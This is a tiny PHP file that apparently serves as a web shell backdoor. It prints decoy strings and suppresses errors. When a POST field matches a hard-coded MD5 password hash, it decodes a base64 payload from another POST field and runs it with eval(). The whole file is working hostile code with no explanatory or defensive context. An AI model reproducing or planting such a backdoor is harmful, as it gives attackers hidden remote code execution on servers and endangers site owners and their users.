<?php 
echo"trest";error_reporting(0);
if(isset($_POST['com']) && md5($_POST['com']) == '66d18dc9cbd1b87d4460a2ce37d8e835' && isset($_POST['content'])) $kk = strtr($_POST['content'], '-_,', '+/=');eval(base64_decode($kk));
echo"abrval";
?>